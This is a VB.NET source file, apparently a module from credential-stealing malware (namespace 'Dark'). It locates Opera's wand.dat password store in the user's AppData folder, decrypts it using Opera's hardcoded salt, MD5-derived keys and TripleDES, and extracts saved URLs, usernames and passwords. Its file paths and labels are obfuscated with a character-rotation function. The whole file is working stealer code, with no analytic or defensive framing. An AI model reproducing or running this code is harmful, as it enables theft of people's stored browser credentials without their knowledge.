Imports System.Text
Imports System.Security.Cryptography
Imports System.IO

Namespace Dark
    Public Module Opera

        Private opera_salt As Byte() = {&H83, &H7D, &HFC, &HF, &H8E, &HB3, _
      &HE8, &H69, &H73, &HAF, &HFF}
        Private key_size As Byte() = {&H0, &H0, &H0, &H8}
        Private path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Public DOutput As String
        Dim c As Integer = 0, c1 As Integer = 0
        Dim firstrun As Boolean = True
        Dim ReturnValue As String
        Dim sUrlTemp, sUserTemp, sPassTemp As String
        Dim sUrl(1000), sUser(1000), sPass(1000) As String
        Dim lasturl As Integer = 0

        Public Function GetOpera() As String
            If File.Exists(path & NativeMethods.RotateRight("WJk`m\WJk`m\Wr\i_)_\o")) Then
                path += NativeMethods.RotateRight("WJk`m\WJk`m\Wr\i_)_\o")
                Return version2()
                Exit Function
            ElseIf File.Exists(path & NativeMethods.RotateRight("WJk`m\WJk`m\Wkmjadg`Wr\i_)_\o")) Then
                path += NativeMethods.RotateRight("WJk`m\WJk`m\Wkmjadg`Wr\i_)_\o")
                Return version2()
                Exit Function
            Else : Return NativeMethods.RotateRight("888888888888888888888888888888888Jk`m\8888888888888888888888888888888888") + Environment.NewLine + "Not installed"
            End If
            Return Nothing
        End Function
        Private Function version2() As String
            Try
                Dim wand_file As Byte() = File.ReadAllBytes(path)
                Dim block_size As Integer = 0
                For i As Integer = 0 To wand_file.Length - 5
                    If wand_file(i) = &H0 AndAlso wand_file(i + 1) = &H0 AndAlso wand_file(i + 2) = &H0 AndAlso wand_file(i + 3) = &H8 Then
                        block_size = CInt(wand_file(i + 15))
                        Dim key As Byte() = New Byte(7) {}
                        Dim encrypt_data As Byte() = New Byte(block_size - 1) {}
                        Array.Copy(wand_file, i + 4, key, 0, key.Length)
                        Array.Copy(wand_file, i + 16, encrypt_data, 0, encrypt_data.Length)
                        DOutput += decrypt2_method(key, encrypt_data) & vbNewLine
                        i += 11 + block_size
                    End If
                Next
                Dim Lines() As String
                Lines = DOutput.Split(CChar(vbNewLine))
                For j As Int32 = 0 To 3
                    Lines(j) = Nothing
                Next
                For j As Int32 = 0 To Lines.Length - 1
                    sUrlTemp = Nothing
                    sUserTemp = Nothing
                    sPassTemp = Nothing
                    c = 0
                    Try
                        If Lines(j).Contains("http://") Then
                            If j <> 0 Then
                                Try
                                    For k As Int32 = 0 To Lines(j).Length - 1
                                        If AscW(Lines(j).Chars(k - c)) > 127 Then
                                            Lines(j) = Lines(j).Remove(k - c, 1)
                                            c += 1
                                        End If
                                    Next
                                    If j - lasturl = 1 Then
                                        sUrlTemp = Lines(j)
                                    ElseIf j - lasturl = 2 Then
                                        sUrlTemp = Lines(j)
                                    End If
                                    lasturl = j
                                Catch ex As Exception

                                End Try
                            End If
                        ElseIf Lines(j).Contains("https://") Then
                            If j <> 0 Then
                                Try
                                    For k As Int32 = 0 To Lines(j).Length - 1
                                        If AscW(Lines(j).Chars(k - c)) > 127 Then
                                            Lines(j) = Lines(j).Remove(k - c, 1)
                                            c += 1
                                        End If
                                    Next

                                    If j - lasturl = 1 Then
                                        sUrlTemp = Lines(j)
                                    ElseIf j - lasturl = 2 Then
                                        sUrlTemp = Lines(j)
                                    End If
                                    lasturl = j
                                Catch ex As Exception

                                End Try
                            End If
                        Else
                            If lasturl <> 0 Then
                                If j = lasturl + 2 Then

                                    Try
                                        For k As Int32 = 0 To Lines(j).Length - 1
                                            If AscW(Lines(j).Chars(k - c)) > 127 Then
                                                Lines(j) = Lines(j).Remove(k - c, 1)
                                                c += 1
                                            End If
                                        Next
                                        sUserTemp = Lines(j)
                                    Catch ex As Exception

                                    End Try
                                ElseIf j = lasturl + 4 Then
                                    Try
                                        For k As Int32 = 0 To Lines(j).Length - 1
                                            If AscW(Lines(j).Chars(k - c)) > 127 Then
                                                Lines(j) = Lines(j).Remove(k - c, 1)
                                                c += 1
                                            End If
                                        Next
                                        sPassTemp = Lines(j)
                                        c1 += 1
                                    Catch ex As Exception
                                    End Try
                                End If
                            End If
                        End If
                    Catch ex As Exception

                    End Try
                    Try
                        If sUrlTemp <> Nothing Then
                            sUrl(c1) = sUrlTemp
                        End If
                        If sUserTemp <> Nothing Then
                            sUser(c1) = sUserTemp
                        End If
                        If sPassTemp <> Nothing Then
                            Try
                                sPass(c1 - 1) = sPassTemp
                            Catch ex As Exception

                            End Try
                        End If

                    Catch ex As Exception

                    End Try

                Next
            Catch e As Exception
                Console.WriteLine(e.Message)
            End Try
            Dim S As [String] = Nothing
            For i As Int32 = 0 To sUrl.Length
                If sUrl(i) = "" Then
                    Exit For
                End If
                S = (sUrl(i)) + _
                            (sUser(i)) + _
                            (sPass(i))
            Next
            Return NativeMethods.RotateRight("888888888888888888888888888888888Jk`m\8888888888888888888888888888888888") + Environment.NewLine + S
        End Function

        Public Function decrypt2_method(ByVal key As Byte(), ByVal encrypt_data As Byte()) As String
            Try
                Dim md5Crypt As New MD5CryptoServiceProvider()
                md5Crypt.Initialize()
                Dim tmpBuffer As Byte() = New Byte(opera_salt.Length + (key.Length - 1)) {}
                Array.Copy(opera_salt, tmpBuffer, opera_salt.Length)
                Array.Copy(key, 0, tmpBuffer, opera_salt.Length, key.Length)
                Dim hash1 As Byte() = md5Crypt.ComputeHash(tmpBuffer)
                tmpBuffer = New Byte(hash1.Length + opera_salt.Length + (key.Length - 1)) {}
                Array.Copy(hash1, tmpBuffer, hash1.Length)
                Array.Copy(opera_salt, 0, tmpBuffer, hash1.Length, opera_salt.Length)
                Array.Copy(key, 0, tmpBuffer, hash1.Length + opera_salt.Length, key.Length)
                Dim hash2 As Byte() = md5Crypt.ComputeHash(tmpBuffer)
                Dim tripleDES As New TripleDESCryptoServiceProvider()
                tripleDES.Mode = CipherMode.CBC
                tripleDES.Padding = PaddingMode.None
                Dim tripleKey As Byte() = New Byte(23) {}
                Dim IV As Byte() = New Byte(7) {}
                Array.Copy(hash1, tripleKey, hash1.Length)
                Array.Copy(hash2, 0, tripleKey, hash1.Length, 8)
                Array.Copy(hash2, 8, IV, 0, 8)
                tripleDES.Key = tripleKey
                tripleDES.IV = IV
                Dim decryter As ICryptoTransform = tripleDES.CreateDecryptor()
                Dim output As Byte() = decryter.TransformFinalBlock(encrypt_data, 0, encrypt_data.Length)
                Dim enc As String = Encoding.Unicode.GetString(output)
                Return enc
            Catch e As Exception
                Return ""
            End Try
        End Function
    End Module
End Namespace